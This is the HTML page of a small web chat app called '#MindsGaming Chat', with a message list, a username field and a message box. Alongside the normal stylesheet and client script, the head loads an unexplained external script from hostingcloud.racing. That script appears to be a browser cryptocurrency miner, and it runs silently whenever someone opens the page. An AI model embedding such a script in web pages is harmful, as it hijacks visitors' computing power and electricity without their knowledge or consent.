<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
    <title>#MindsGaming Chat</title>

    <link rel="stylesheet" href="style.css" />

    <script src="client.js" defer></script>
  </head>
  <body>
    <div class="background">
      
    <section class="dreams">
      <ul id="chat"></ul>
    </section>
    <center>
      <form class="form">
        <input
          class="hide"
          name="username"
          aria-label="a new dream"
          type="text"
          maxlength="100"
          placeholder="Username"
        />
        <input
          class="fixed"
          name="something"
          aria-label="a new dream"
          type="text"
          maxlength="100"
          placeholder="Write Something!"
        />
        <button type="submit" id="submit-dream">Send</button>
      </form>
    </center>
      <label id="holdme"></label>
    </div>
  </body>
</html>
